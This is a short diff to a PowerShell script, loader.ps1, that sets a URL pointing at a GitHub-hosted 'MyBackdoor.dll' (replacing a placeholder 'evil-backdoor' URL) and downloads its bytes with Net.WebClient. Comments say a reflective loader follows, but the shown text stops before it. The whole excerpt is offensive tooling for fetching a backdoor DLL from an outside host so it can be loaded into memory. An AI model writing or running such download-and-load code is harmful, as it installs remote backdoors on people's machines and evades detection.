@@ -1,7 +1,7 @@
 # loader.ps1
 
 # 1) Download the DLL bytes
-$payloadUrl = 'https://raw.githubusercontent.com/YourUser/evil-backdoor/main/payload.dll'
+$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
 $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
 
 # 2) Define a correct reflective loader
